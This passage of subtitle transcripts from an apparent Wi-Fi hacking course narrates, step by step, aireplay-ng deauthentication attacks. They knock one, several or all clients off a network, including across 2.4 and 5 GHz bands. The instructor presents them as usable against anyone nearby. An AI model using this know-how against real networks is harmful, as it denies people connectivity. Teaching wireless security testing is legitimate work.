00:02:07,230 --> 00:02:12,540
You'll see that the Mac address for this computer is 0021 and ends up with zero six.

29
00:02:13,530 --> 00:02:21,630
So if we go here, we can see that this I'm just going to control C to stop this and we can see that

30
00:02:21,630 --> 00:02:22,950
we have that machine.

31
00:02:22,950 --> 00:02:29,040
The Windows machine is showing up here in the second section of Airodump NG, which is the section that

32
00:02:29,040 --> 00:02:33,720
contains the connected devices or the connected clients, as we said before.

33
00:02:33,720 --> 00:02:37,890
And we can see that the Windows computer is showing up here with this Mac address.

34
00:02:37,980 --> 00:02:44,370
So if we want to disconnect that computer, we can do that using airplay, as I said, And the command

35
00:02:44,370 --> 00:02:45,630
is going to be very simple.

36
00:02:45,630 --> 00:02:46,590
It's going to be airplay.

37
00:02:47,520 --> 00:02:52,320
Now, airplay can be used to do a lot of things, and we'll see that in future lectures.

38
00:02:52,320 --> 00:02:55,620
For now, we want to use it to do a D authentication attack.

39
00:02:55,620 --> 00:02:59,730
So we're going to tell it that I want to run a D authentication, attack the auth.

40
00:03:00,770 --> 00:03:07,010
Then we're going to specify the number of the authentication packets to send, and we're going to use

41
00:03:07,010 --> 00:03:08,240
a very large number.

42
00:03:08,240 --> 00:03:11,960
So we keep sending these packets and the device stays disconnected.

43
00:03:12,630 --> 00:03:16,290
Then we're going to give it the Mac address of the target access point.

44
00:03:16,290 --> 00:03:21,630
So this is the target wireless network or access point, and this is the Mac address of it.

45
00:03:21,630 --> 00:03:23,400
It's the same as this.

46
00:03:26,560 --> 00:03:31,420
Then we're going to say minus C to give it the machine that we want to disconnect.

47
00:03:31,420 --> 00:03:34,690
And in our example, we want to disconnect the Windows machine.

48
00:03:34,690 --> 00:03:36,730
And this is its Mac address.

49
00:03:37,920 --> 00:03:42,540
So I'm going to copy it and I'm going to paste it here.

50
00:03:44,150 --> 00:03:48,740
And finally, we're going to give it the interface that has monitor mode enabled on it.

51
00:03:48,740 --> 00:03:50,900
And for me it's called Mod zero.

52
00:03:52,460 --> 00:03:54,220
Again, the command is very simple.

53
00:03:54,230 --> 00:03:56,030
It's a replay engine.

54
00:03:56,150 --> 00:03:58,490
That's the program that we're going to use.

55
00:03:58,520 --> 00:04:01,930
We're telling it that we want to do a D authentication attack.

56
00:04:01,940 --> 00:04:06,860
We're going to use a very large number of packets to keep the target computer disconnected.

57
00:04:06,860 --> 00:04:09,380
And we want to target this network.

58
00:04:09,380 --> 00:04:14,690
So this is the Bssid or the Mac address of the target access point or network.

59
00:04:14,780 --> 00:04:19,430
And we want to disconnect this specific device from that network.

60
00:04:19,430 --> 00:04:24,890
So we're only disconnecting one device from that network and we gave it the Mac address of that device

61
00:04:24,890 --> 00:04:26,630
and that's my Windows device.

62
00:04:26,780 --> 00:04:29,540
So now let's let me just go back here to the Windows device.

63
00:04:29,540 --> 00:04:31,520
And again, you can see the Mac address here.

64
00:04:31,520 --> 00:04:38,300
And if we click here on the Wi-Fi, you'll see that this machine is actually connected over Wi-Fi and

65
00:04:38,300 --> 00:04:43,700
it's connected to that network, the UPC 0916 at the end.

66
00:04:43,760 --> 00:04:48,770
And if we go to the browser and open something, you'll see that we have Internet connection.

67
00:04:50,230 --> 00:04:52,390
So if you go to Google.com.

68
00:04:54,200 --> 00:04:57,760
You can see that this computer is actually connected to the Internet.

69
00:04:57,770 --> 00:05:03,110
So I'm going to go here and I'm going to hit enter to run this attack.

70
00:05:05,580 --> 00:05:10,260
Now, if we go to the Windows machine and try to open anything.

71
00:05:10,260 --> 00:05:12,900
So let's go to Bing.com, for example.

72
00:05:15,100 --> 00:05:17,860
You'll see that we lost our Internet connection.

73
00:05:17,860 --> 00:05:22,780
And if you look here on the Wi-Fi icon, you'll see that it's actually not connected anymore.

74
00:05:22,780 --> 00:05:25,210
And we can see that this is our network.

75
00:05:25,210 --> 00:05:27,730
And again, we're still we're not connected to it.

76
00:05:27,730 --> 00:05:34,810
And even if we try to go and connect to it, we won't be able to connect because the Linux machine is

77
00:05:34,810 --> 00:05:40,390
constantly sending the the authentication packets preventing this machine from connecting.

78
00:05:40,390 --> 00:05:42,820
So again, it looks like as if it's connected.

79
00:05:42,910 --> 00:05:46,660
But if we go here and try to open something.

80
00:05:47,340 --> 00:05:49,260
You'll see that we have no Internet connection.

81
00:05:49,260 --> 00:05:52,560
And now I'm clicking on the try again and nothing is happening.

82
00:05:52,560 --> 00:05:57,150
And if we give it a little bit more time, we'll actually going to get disconnected again.

83
00:05:57,870 --> 00:06:01,470
Now Bing is not loading even if we go and try Google.

84
00:06:02,420 --> 00:06:05,320
And again, we lost the connection right here.

85
00:06:05,330 --> 00:06:09,890
And we're back to basically disconnected, like completely disconnected.

86
00:06:09,890 --> 00:06:13,430
It's not like we're connected to the network and we don't have Internet access.

87
00:06:13,460 --> 00:06:16,040
We're actually completely disconnected from the network.

88
00:06:16,040 --> 00:06:18,350
And Windows is constantly trying to connect back.

89
00:06:18,350 --> 00:06:24,350
But as soon as it connects back, it gets disconnected again because this Kali machine is constantly

90
00:06:24,350 --> 00:06:27,500
sending these the authentication packets.

91
00:06:27,530 --> 00:06:32,720
Now again, this attack works without the need to know the key or the password to the target network,

92
00:06:32,720 --> 00:06:35,270
and it works against all operating systems.

93
00:06:35,270 --> 00:06:39,440
So against Windows, Linux, OSX, iPhone, Android, whatever.

94
00:06:39,440 --> 00:06:46,070
As long as the device uses WiFi, you can use this attack and kick them out of any network that they're

95
00:06:46,070 --> 00:06:47,000
connected to.

96
00:06:47,450 --> 00:06:53,150
Now to exit out of this attack, you can just press control C at the same time and it will terminate.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,110 --> 00:00:06,650
Now, in this video, I'd like to show you how to disconnect multiple devices or all devices from one

2
00:00:06,650 --> 00:00:10,730
network or disconnect all devices from a number of networks.

3
00:00:10,730 --> 00:00:15,530
So basically disconnect anyone around you from connecting to any network around you.

4
00:00:15,560 --> 00:00:19,460
You can do all of that using the same tool and using the same command.

5
00:00:19,460 --> 00:00:23,570
Really, the only thing is you'll need to run the command multiple times.

6
00:00:23,570 --> 00:00:25,490
That's the whole idea behind it.

7
00:00:26,340 --> 00:00:31,880
So in the previous video we targeted the Windows machine and the command we used was this.

8
00:00:31,890 --> 00:00:33,480
So we did a replay.

9
00:00:33,840 --> 00:00:37,620
We told it to do the authentication, a large number of packets.

10
00:00:37,650 --> 00:00:43,740
We put the Mac address of the target network and then we put the Mac address of the Target computer

11
00:00:43,740 --> 00:00:46,260
and this was the Mac address of the Windows computer.

12
00:00:46,350 --> 00:00:48,690
So you can run that command.

13
00:00:48,690 --> 00:00:54,420
And then if you want to target another computer, all you have to do is just run the same command again,

14
00:00:54,420 --> 00:00:57,660
but specify the Mac address of that second computer.

15
00:00:57,660 --> 00:01:03,600
So you can do that in a separate window or you can split the terminal here, you can split it horizontally

16
00:01:03,600 --> 00:01:08,190
or vertically and then run the command in a separate command prompt.

17
00:01:08,430 --> 00:01:13,170
Alternatively, because this can get really messy if you're targeting more than one computer.

18
00:01:13,170 --> 00:01:19,710
So if you want to target three or 4 or 5 computers, you can run the command in the background.

19
00:01:19,710 --> 00:01:24,300
And I'm going to show you how to do that because first of all, it's a really handy skill to learn because

20
00:01:24,300 --> 00:01:29,800
you can use this with all Linux commands, and it's also much better to do it with this attack instead

21
00:01:29,800 --> 00:01:31,660
of using it in different windows.

22
00:01:31,900 --> 00:01:38,140
So to run this attack, all you have to do is put the ant character right here.

23
00:01:39,150 --> 00:01:45,570
That will tell the Bash or Linux to run this in the background to run this particular command in the

24
00:01:45,570 --> 00:01:46,190
background.

25
00:01:46,200 --> 00:01:51,720
But we still have one problem, because if you remember in the previous video, when we run this command,

26
00:01:51,750 --> 00:01:55,950
the result of airplay kept showing up on screen.

27
00:01:55,950 --> 00:01:59,280
So the screen kept getting filled with the result of airplay.

28
00:01:59,790 --> 00:02:05,970
So even if we run this in the background, our terminal screen will still get full of the output of

29
00:02:05,970 --> 00:02:06,390
airplay.

30
00:02:06,900 --> 00:02:12,330
So what we're going to do is we're going to redirect that output by saying to Dev.

31
00:02:14,090 --> 00:02:14,780
No.

32
00:02:15,890 --> 00:02:18,970
And again, we're going to put the end character to tell.

33
00:02:18,980 --> 00:02:21,710
I want to do all of this in the background.

34
00:02:21,710 --> 00:02:23,240
Don't show it to me at all.

35
00:02:23,240 --> 00:02:27,110
I want to see another command prompt to run another command.

36
00:02:27,140 --> 00:02:32,270
So again, we're using the same command that we did before, so that didn't change at all.

37
00:02:32,270 --> 00:02:38,270
We added the ant character at the end to run the command in the background, and you can do that with

38
00:02:38,270 --> 00:02:40,670
all Linux commands, not only with this command.

39
00:02:40,700 --> 00:02:41,780
Then we told it.

40
00:02:41,810 --> 00:02:47,030
We also want you to redirect the output of a replay to nowhere.

41
00:02:47,030 --> 00:02:48,740
I don't want to see it on my screen.

42
00:02:49,190 --> 00:02:55,640
And we finished again with an ant character to say, I want to do all of this in the background.

43
00:02:55,670 --> 00:03:00,970
Don't show me anything, but keep this process running in a different thread in the background.

44
00:03:00,980 --> 00:03:04,070
So when I hit Enter now I won't see any output.

45
00:03:04,070 --> 00:03:09,920
The command will be running in the background and then I'll be able to run another command and disconnect

46
00:03:09,920 --> 00:03:11,180
another computer.

47
00:03:11,300 --> 00:03:15,780
So before I run this command, I'm going to go to my Windows machine here.

48
00:03:15,780 --> 00:03:22,380
And as you can see, I'm connected again right here to my network, to UPC.

49
00:03:22,650 --> 00:03:25,170
And if I search for anything here.

50
00:03:26,080 --> 00:03:28,450
You can see that I have Internet connection.

51
00:03:28,450 --> 00:03:34,860
So this is going to be my first target and my second target is going to be this OSX machine.

52
00:03:34,870 --> 00:03:37,030
So I'm just going to show you its Mac address.

53
00:03:37,030 --> 00:03:38,380
I'm going to do ifconfig.

54
00:03:41,090 --> 00:03:44,510
And this is the Mac address of the OSX machine.

55
00:03:44,510 --> 00:03:46,120
So it ends up with E8.

56
00:03:46,130 --> 00:03:49,460
And if we come here, we can see it.

57
00:03:49,460 --> 00:03:52,400
It's right here, so I'm actually going to copy it.

58
00:03:53,250 --> 00:03:57,870
And I'm going to run this command and you'll see when I hit enter, I'll won't see anything on screen.

59
00:03:57,870 --> 00:04:02,250
I'll just see a prompt telling me that this command is running and that's it.

60
00:04:02,250 --> 00:04:05,640
I won't see the same output that we got in previous video.

61
00:04:05,640 --> 00:04:06,990
So I'm going to hit Enter.

62
00:04:07,170 --> 00:04:12,000
And as you can see, all I did is I just got the job ID, which is number one.

63
00:04:12,000 --> 00:04:17,640
So this is the number of jobs that's running in the background of this particular terminal window.

64
00:04:18,520 --> 00:04:20,320
So if I do jobs.

65
00:04:21,560 --> 00:04:25,010
You'll see that I have one job running and that's a replay.

66
00:04:25,310 --> 00:04:27,590
And I can see the whole command that I used.

67
00:04:28,580 --> 00:04:33,500
So this is the authenticating the windows machine at the moment and we'll go to it in a second.

68
00:04:33,500 --> 00:04:39,200
I just want to do the OSX machine and then we check out the two machines and see how both of them lost

69
00:04:39,200 --> 00:04:40,160
their connection.

70
00:04:40,160 --> 00:04:42,710
So I'm going to run the exact same command again.

71
00:04:42,710 --> 00:04:48,680
And instead of the Mac address of the windows, I'm going to put the Mac address of the OSX machine.

72
00:04:52,130 --> 00:04:53,570
And I'm going to hit Enter.

73
00:04:54,400 --> 00:04:57,460
And you can see that I have another job added to the background.

74
00:04:57,460 --> 00:05:00,250
And this one has an ID of number two.

75
00:05:00,520 --> 00:05:02,110
So if I do jobs.

76
00:05:03,960 --> 00:05:08,580
You can see that I have two jobs running that are the exact same command, targeting the exact same

77
00:05:08,580 --> 00:05:14,670
network, but one of them is targeting the Windows machine and the other is targeting my Mac OS X machine.

78
00:05:14,940 --> 00:05:19,290
So we go to the Windows machine and we look at the bottom.

79
00:05:19,530 --> 00:05:23,040
And sure enough, it doesn't have Internet connection right here.

80
00:05:23,040 --> 00:05:26,460
And even if I try to go to a website just to confirm that.

81
00:05:29,410 --> 00:05:33,010
We can see that it's completely disconnected from its network.

82
00:05:33,820 --> 00:05:39,940
Now I'm going to go to the OSX machine and try to open the browser right here.

83
00:05:41,210 --> 00:05:42,950
Let's try to go to Google.

84
00:05:48,610 --> 00:05:51,490
And as you can see, there is nothing showing up.

85
00:05:51,490 --> 00:05:54,940
We can't connect to Google or we can't go to any website we want.

86
00:05:54,970 --> 00:05:57,760
We literally have no connection to the network.

87
00:05:58,300 --> 00:06:04,360
So we managed to do that by running a replay twice on those two specific devices.

88
00:06:04,360 --> 00:06:08,920
So if you wanted to target two devices, three devices, again run the command three times, you want

89
00:06:08,920 --> 00:06:11,040
to target five devices, run it five times.

90
00:06:11,050 --> 00:06:16,360
This can be very useful if you want to connect a number of devices, but not all devices.

91
00:06:16,360 --> 00:06:22,360
So you want it to target 2 or 3 devices and keep your own device or a certain device connected for a

92
00:06:22,360 --> 00:06:23,290
certain reason.

93
00:06:23,590 --> 00:06:29,950
Now, these commands are still running in the background, so if you can stop them based on the ID right

94
00:06:29,950 --> 00:06:35,380
here so you can see that the first command has an ID of number one and the second command has an ID

95
00:06:35,380 --> 00:06:36,430
of number two.

96
00:06:36,460 --> 00:06:40,270
So you can stop all of them by saying kill all.

97
00:06:42,930 --> 00:06:43,500
A replay.

98
00:06:47,510 --> 00:06:52,640
And that will stop all aireplay ng processes, including the two of them.

99
00:06:52,640 --> 00:06:57,260
But if you wanted to stop one of them at a time, then you're going to do kill.

100
00:06:58,720 --> 00:07:04,420
Percentage, number one, and that will only kill the first process.

101
00:07:04,420 --> 00:07:07,720
So that's only going to kill our Windows machine process.

102
00:07:07,720 --> 00:07:10,090
And if we do jobs now.

103
00:07:11,710 --> 00:07:16,900
You can see that the first process got terminated, but the second one is still running.

104
00:07:17,830 --> 00:07:21,280
Now I'm going to do the second command, the kill all command just to show it to you.

105
00:07:21,280 --> 00:07:24,970
And this command will kill all airplay instances.

106
00:07:24,970 --> 00:07:26,440
So if we do kill all.

107
00:07:31,840 --> 00:07:33,430
And then do jobs.

108
00:07:34,950 --> 00:07:38,130
You'll see that the second process also got terminated.

109
00:07:38,130 --> 00:07:40,560
So I could have killed it with percentage too.

110
00:07:40,560 --> 00:07:47,670
Or you can do this method if you want it to just stop the attack and kill all the instances that's disconnecting

111
00:07:47,850 --> 00:07:49,230
devices around you.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,440 --> 00:00:05,510
Now, so far we know how to disconnect any device from any networks around us.

2
00:00:05,540 --> 00:00:09,440
We also learned how to disconnect multiple devices from networks.

3
00:00:09,440 --> 00:00:14,300
As long as these devices and these networks are within our Wi-Fi range.

4
00:00:14,330 --> 00:00:20,840
The last thing that I want to show you is how to disconnect all devices from a specific network.

5
00:00:20,870 --> 00:00:26,540
And I also want to cover an issue that you might face when you do these authentication attacks.

6
00:00:26,570 --> 00:00:32,220
So first of all, I'm just going to run airodump NG against all the networks around me.

7
00:00:32,240 --> 00:00:34,760
So just airodump ng one zero.

8
00:00:36,610 --> 00:00:41,710
And right here we can see the networks around me and then I can pick any one that I want to target.

9
00:00:41,710 --> 00:00:43,540
So I'm going to control C out of this.

10
00:00:44,760 --> 00:00:49,470
And my target network is going to be this network, the 196 network.

11
00:00:49,470 --> 00:00:55,950
And I'm going to run this attack to disconnect all devices that's connected to this network.

12
00:00:55,950 --> 00:00:59,040
So if I come here, we have this Windows device.

13
00:00:59,070 --> 00:01:03,150
The Windows device is connected right here.

14
00:01:03,150 --> 00:01:06,180
And if we try to go to Google.com.

15
00:01:07,670 --> 00:01:10,310
You'll see that we have Internet connection.

16
00:01:10,580 --> 00:01:14,750
So we're going to run the same command that we used to do before.

17
00:01:14,780 --> 00:01:18,630
The only difference is this time we're not going to specify a client.

18
00:01:18,650 --> 00:01:21,090
We're not going to specify a target computer.

19
00:01:21,110 --> 00:01:24,280
We're only going to specify a target network.

20
00:01:24,290 --> 00:01:30,500
And I'm just going to right click this and copy the Mac address of my target network.

21
00:01:30,800 --> 00:01:34,070
And then I'm going to run aireplay ng like we did before.

22
00:01:36,330 --> 00:01:38,100
We're going to do the fourth attack.

23
00:01:39,980 --> 00:01:42,350
And I'm going to specify the number of packets.

24
00:01:42,350 --> 00:01:46,370
So that's going to be a very large number like we used to do before.

25
00:01:48,290 --> 00:01:50,870
Then I'm going to specify the target network.

26
00:01:53,060 --> 00:01:55,970
And thus the Mac address of my access point.

27
00:01:55,970 --> 00:02:01,040
And usually I do minus C and give the target client or the target computer.

28
00:02:01,040 --> 00:02:04,970
But in this case, in today's lecture, we want to target all computers.

29
00:02:04,970 --> 00:02:06,560
So we're not going to do that.

30
00:02:06,560 --> 00:02:10,910
And then I'm going to give it the wireless card that has monitor mode enabled on it.

31
00:02:10,910 --> 00:02:13,070
And it's one zero in my case.

32
00:02:14,190 --> 00:02:17,010
So it's the exact same command that we used to do before.

33
00:02:17,040 --> 00:02:21,240
The only difference is we didn't specify a target computer.

34
00:02:21,240 --> 00:02:23,640
We didn't specify a minus C argument.

35
00:02:23,670 --> 00:02:29,220
Now, if I run this like this, I'm actually going to get an error and you might even get that error.

36
00:02:29,220 --> 00:02:34,230
With the normal attacks, though, with the attacks where you are specifying a mac address that we showed

37
00:02:34,230 --> 00:02:35,510
in previous lectures.

38
00:02:35,520 --> 00:02:37,920
But for me it only shows this error.

39
00:02:37,920 --> 00:02:42,840
Now when I specify, when I don't specify a target Mac address, but I'm going to show you how to fix

40
00:02:42,840 --> 00:02:43,670
it anyway.

41
00:02:43,680 --> 00:02:50,310
So I'm going to hit Enter and you'll see that Aireplay ng will hang for a little bit and then it's going

42
00:02:50,310 --> 00:02:54,270
to throw me an error saying that the bssid is invalid.

43
00:02:54,270 --> 00:02:58,710
But clearly the bssid is correct and I use the right Mac address.

44
00:02:58,740 --> 00:03:04,710
The problem with this is the channel, so you can see that it's saying that my wireless card that it's

45
00:03:04,710 --> 00:03:07,230
waiting for beacons on Channel seven.

46
00:03:07,230 --> 00:03:13,290
And if we look at our target network, you'll see that it's running on Channel 11.

47
00:03:14,390 --> 00:03:20,590
So to fix this issue, just run airodump ng against that specific network that you want to target.

48
00:03:20,600 --> 00:03:22,910
So I'm going to specify the bssid.

49
00:03:27,250 --> 00:03:29,710
And I'm going to also specify the channel.

50
00:03:31,550 --> 00:03:32,780
And run aero dump.

51
00:03:32,780 --> 00:03:37,490
Angie So we actually seen how to do that with the targeted Airodump ng command in the.

52
00:03:37,670 --> 00:03:38,900
In previous lectures.

53
00:03:38,900 --> 00:03:45,140
So it's just airodump ng we give it the bssid, the Mac address of the target network and then we give

54
00:03:45,140 --> 00:03:49,040
it the channel, which is the channel that the target network is running on.

55
00:03:49,040 --> 00:03:54,740
And my target network is right here running on Channel 11 and this is its Bssid.

56
00:03:55,970 --> 00:04:01,730
So I'm going to hit enter and this will just launch airodump ng Normally for me, it'll show me the

57
00:04:01,730 --> 00:04:04,060
connected clients here in the second part.

58
00:04:04,070 --> 00:04:07,460
But now if I come back here and run this attack.

59
00:04:08,580 --> 00:04:10,230
The attack will actually work.

60
00:04:10,590 --> 00:04:17,370
And if I go here on the Windows machine that's connected to the 916 Network, you'll see that it's going

61
00:04:17,370 --> 00:04:19,170
to get disconnected in a second.

62
00:04:19,170 --> 00:04:22,260
But now if I browse the Internet, it's not going to work.

63
00:04:22,290 --> 00:04:26,190
And you'll see that I lost my Internet connection here.

64
00:04:26,340 --> 00:04:35,130
And basically all devices that's connected to this UPC network, the 916, should have lost their connection

65
00:04:35,130 --> 00:04:43,200
by now because we're targeting all the devices in the network because we didn't specify A minus C in

66
00:04:43,200 --> 00:04:44,010
this command.

67
00:04:44,010 --> 00:04:46,950
So we only specified A minus A.

68
00:04:46,980 --> 00:04:54,210
Now, keep in mind that when you target a large number of clients, the effectiveness of the attack

69
00:04:54,210 --> 00:04:55,080
is reduced.

70
00:04:55,080 --> 00:04:59,790
So the less clients that you target, the more effective the attack is.

71
00:04:59,820 --> 00:05:06,660
With this particular example, the Windows machine didn't get disconnected for about 50s and then it

72
00:05:06,660 --> 00:05:07,740
got disconnected.

73
00:05:07,740 --> 00:05:13,720
So keep this in mind that the more clients that you target, the less effective the attack.

74
00:05:13,750 --> 00:05:20,290
Also, keep in mind the issue that I faced in this lecture where Airodump were aireplay ng said it couldn't

75
00:05:20,290 --> 00:05:21,460
find the bssid.

76
00:05:21,640 --> 00:05:28,240
If you do face that issue, then just run airodump ng before you run the attack and make sure you run

77
00:05:28,240 --> 00:05:36,790
airodump ng using the minus minus channel and the minus minus bssid arguments against the same network

78
00:05:36,790 --> 00:05:37,810
that you're targeting.

79
00:05:39,160 --> 00:05:40,060
So that's it.

80
00:05:40,060 --> 00:05:47,710
So far, we know how to disconnect one client, multiple clients or all clients from any network around

81
00:05:47,710 --> 00:05:50,650
us, even if that network uses a password.

82
00:05:50,650 --> 00:05:56,530
And even if we don't know that password, and if we're not connected to that network, as long as the

83
00:05:56,530 --> 00:06:02,230
network and the devices are within our range, we can control their connections and prevent them from

84
00:06:02,230 --> 00:06:03,010
connecting.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,380 --> 00:00:04,790
Now that we know how to launch a basic authentication attack.

2
00:00:04,820 --> 00:00:08,270
In this lecture, we're going to cover a more complex scenario.

3
00:00:08,600 --> 00:00:16,490
So let's say the target access point broadcasts over both 2.4 and five gigahertz frequencies.

4
00:00:16,520 --> 00:00:22,850
In that case, you're going to have two networks that could possibly have the same name or they could

5
00:00:22,850 --> 00:00:24,500
have different names.

6
00:00:24,530 --> 00:00:30,950
The problem is, though, this device, the target client, can either connect to the five gigahertz

7
00:00:30,950 --> 00:00:34,730
version or to the 2.4GHz version.

8
00:00:34,760 --> 00:00:41,990
Therefore, if you authenticate it and disconnected from the 2.4, it will automatically connect to

9
00:00:41,990 --> 00:00:44,930
the five gigahertz version and vice versa.

10
00:00:44,930 --> 00:00:50,690
If you disconnected from the five gigahertz, it will automatically connect to the 2.4.

11
00:00:50,720 --> 00:00:55,490
Therefore, you might follow the steps that I showed you in the previous lecture and think that the

12
00:00:55,490 --> 00:01:02,250
attack is not working when it's actually working, but the target is switching to a completely different

13
00:01:02,280 --> 00:01:03,030
network.

14
00:01:03,060 --> 00:01:05,310
So let me show you an example.

15
00:01:05,520 --> 00:01:10,740
I'm going to, first of all, run airodump ng using the band argument, and we're going to set that

16
00:01:10,740 --> 00:01:17,100
to ABG so we can list networks on both bands, the 2.4 and the five gigahertz frequencies.

17
00:01:17,100 --> 00:01:23,190
And then I'm going to give it my wireless adapter in monitor mode, which is nonzero exactly as we shown

18
00:01:23,190 --> 00:01:24,630
in the previous lectures.

19
00:01:24,780 --> 00:01:29,820
I'm going to give it some time to list all of the networks around me, or at least show me the target

20
00:01:29,850 --> 00:01:30,630
network.

21
00:01:32,310 --> 00:01:33,180
And perfect.

22
00:01:33,180 --> 00:01:36,930
Right now my target is actually this network in this lecture.

23
00:01:36,930 --> 00:01:43,590
And if you look closely, you'll actually see that we have two entries that have the same network name,

24
00:01:43,590 --> 00:01:45,540
which is my target network.

25
00:01:46,200 --> 00:01:53,130
If you look even closer, you'll see these two seemingly identical networks are actually different.

26
00:01:53,130 --> 00:01:56,750
So you'll notice that the Mac address for these networks is different.

27
00:01:56,760 --> 00:02:03,030
This one ends with two nine and this one ends with two a If you look at the channel, you'll see this

28
00:02:03,030 --> 00:02:07,560
one has a channel of 100 and this one is operating on Channel one.

29
00:02:07,980 --> 00:02:13,590
So unlike the previous example where the names were different when the network was operating on different

30
00:02:13,590 --> 00:02:20,460
bands, in this example, you can see that the network has the same name, but it's broadcasting over

31
00:02:20,460 --> 00:02:23,970
the two bands, the 2.4 and the five gigahertz frequency.

32
00:02:23,970 --> 00:02:28,980
And we can see that because of the different channels used and the different Mac addresses.

33
00:02:30,470 --> 00:02:36,350
Therefore, if we target a device that is connected to one of these networks, this device will probably

34
00:02:36,350 --> 00:02:41,510
automatically connect to the other band when we disconnect it from its current band.

35
00:02:41,930 --> 00:02:43,520
Let me show you the example.

36
00:02:43,520 --> 00:02:50,450
So first of all, we're going to run airodump ng in here against the 2.4GHz network, so I'm going to

37
00:02:50,450 --> 00:02:52,160
copy its Mac address.

38
00:02:52,840 --> 00:02:56,680
And we're going to run airodump ng exactly as we've seen before.

39
00:02:56,680 --> 00:02:58,150
So I'm going to do it quickly.

40
00:02:58,240 --> 00:03:00,910
We're going to give it the Ssid.

41
00:03:02,250 --> 00:03:06,960
The channel and in this case, it's Channel one, as you can see.

42
00:03:10,210 --> 00:03:13,990
And then we're going to give it my wireless adapter in monitor mode.

43
00:03:14,440 --> 00:03:20,530
Then I'm going to repeat the same command, but this time I'm going to run it against the five gigahertz

44
00:03:20,530 --> 00:03:21,310
frequency.

45
00:03:21,310 --> 00:03:23,440
So I'm going to copy this.

46
00:03:25,020 --> 00:03:27,750
And we're going to do this pretty much the same command.

47
00:03:30,870 --> 00:03:34,140
But this time the channel is 100.

48
00:03:36,790 --> 00:03:38,980
And we're going to give it the interface.

49
00:03:39,130 --> 00:03:45,160
So now I'll be able to see when the target client switches between networks and then I'm going to run

50
00:03:45,160 --> 00:03:51,460
the authentication attack twice as well to make sure I'm disconnected from both networks.

51
00:03:51,940 --> 00:03:55,270
So we're going to hit enter here and hit enter here.

52
00:03:56,370 --> 00:04:03,000
And I'm actually going to be targeting my iPhone device in this video because iPhones started automatically

53
00:04:03,000 --> 00:04:06,720
switching between bands since iOS 14 and up.

54
00:04:06,720 --> 00:04:10,350
And it's also using the private address feature.

55
00:04:10,350 --> 00:04:13,020
So it doesn't get any trickier than this.

56
00:04:13,500 --> 00:04:17,190
So as you can see, my iPhone is connected to this network.

57
00:04:17,190 --> 00:04:22,770
And if I go on more information, you can see the private address is enabled and the Mac address ends

58
00:04:22,770 --> 00:04:26,520
with a D, So it's basically this Mac address right here.

59
00:04:27,490 --> 00:04:33,220
So right now, the iPhone is connected to the 2.4GHz version of the network because we can see it's

60
00:04:33,220 --> 00:04:38,150
this one right here with Channel One, which means that it's operating on 2.4.

61
00:04:38,170 --> 00:04:44,260
And what I'm going to do now is I'm going to run the the authentication attack exactly as I showed you

62
00:04:44,260 --> 00:04:45,580
in the previous lecture.

63
00:04:45,580 --> 00:04:50,200
So we're going to do a replay and G dash dash the auth.

64
00:04:51,320 --> 00:04:56,660
And instead of giving it a really large number of packets, I'm simply going to type zero, which means

65
00:04:56,660 --> 00:05:00,170
I want to authenticate this device indefinitely.

66
00:05:00,320 --> 00:05:08,360
Then I'm going to use the Dash a argument to specify the Mac address of the network of the target network.

67
00:05:08,390 --> 00:05:11,390
And as you can see, it's connected to this network right here.

68
00:05:11,390 --> 00:05:15,680
So this will be the Mac address that we're specifying and then we're going to do.

69
00:05:15,710 --> 00:05:18,140
Dash C to specify the client.

70
00:05:18,140 --> 00:05:26,390
And as we said, our client is this one that has the ad Mac address and we're going to paste it here

71
00:05:26,390 --> 00:05:29,030
and we're going to follow this with Mon zero.

72
00:05:29,210 --> 00:05:34,940
So exactly like we did in the previous lecture, we're using airplay and we're doing a Dos attack.

73
00:05:34,940 --> 00:05:37,790
In the last lecture we used a really large number of packets.

74
00:05:37,790 --> 00:05:41,300
This time we're saying zero to say, I want to do this indefinitely.

75
00:05:41,390 --> 00:05:47,060
Dash A and giving it the Mac address of the target network, then Dash C and we're giving it the Mac

76
00:05:47,060 --> 00:05:48,560
address of the client.

77
00:05:48,920 --> 00:05:54,780
Now, I'm actually going to copy this command because I'm going to want to run this once it connects,

78
00:05:54,780 --> 00:06:00,300
or I can even run it straight away to make sure that it will be authenticated when it connects to the

79
00:06:00,300 --> 00:06:05,550
five gigahertz version of the target network, which is this network right here.

80
00:06:06,240 --> 00:06:08,100
So we're going to hit enter.

81
00:06:09,900 --> 00:06:13,370
And as you can see, it seems like we're getting disconnected.

82
00:06:13,380 --> 00:06:21,810
But if we actually go to my browser and just browse for anything, we actually did get disconnected

83
00:06:21,810 --> 00:06:26,280
for a split second, as you can see, but we managed to get our connection back.

84
00:06:27,550 --> 00:06:33,400
So to fix this, we're actually going to run the replay command again here in a new window.

85
00:06:33,820 --> 00:06:35,380
I'm going to paste the command.

86
00:06:35,380 --> 00:06:41,530
And the only difference this time is that I'm going to specify the target as the five gigahertz network

87
00:06:41,530 --> 00:06:42,930
that I have right here.

88
00:06:42,940 --> 00:06:45,600
So the Mac address is going to be this one.

89
00:06:45,610 --> 00:06:50,320
So we're just going to modify it in here and it's actually the same Mac address.

90
00:06:50,320 --> 00:06:52,630
The only difference is the last two characters.

91
00:06:52,630 --> 00:06:54,910
So it's two A in here.

92
00:06:58,310 --> 00:07:03,980
So now we're using this Mac right here, which is the same as what we have in here, because we're already

93
00:07:03,980 --> 00:07:07,010
authenticating it from this network in this window.

94
00:07:09,710 --> 00:07:15,770
Now also because we are the authenticating it now from a five gigahertz network.

95
00:07:15,800 --> 00:07:21,470
As I mentioned in the previous lecture, you're going to have to add the Dash Capital D argument.

96
00:07:21,890 --> 00:07:25,130
So now that we've done that, we're going to hit enter.

97
00:07:25,580 --> 00:07:30,110
And right now we should be authenticating this client from both networks.

98
00:07:30,110 --> 00:07:34,100
So now let's go on my iPhone and try to go to somewhere else.

99
00:07:34,100 --> 00:07:35,990
So let's go to Bing.com.

100
00:07:38,390 --> 00:07:39,170
And perfect.

101
00:07:39,170 --> 00:07:44,210
As you can see now, we lost the connection completely and we can't really go anywhere.

102
00:07:44,210 --> 00:07:46,180
So if we try to go to Yahoo!

103
00:07:46,190 --> 00:07:47,150
Again, nothing.

104
00:07:47,180 --> 00:07:53,540
We're completely disconnected because we disconnected it from both bands that it could possibly connect

105
00:07:53,540 --> 00:07:54,110
to.

106
00:07:54,140 --> 00:07:59,660
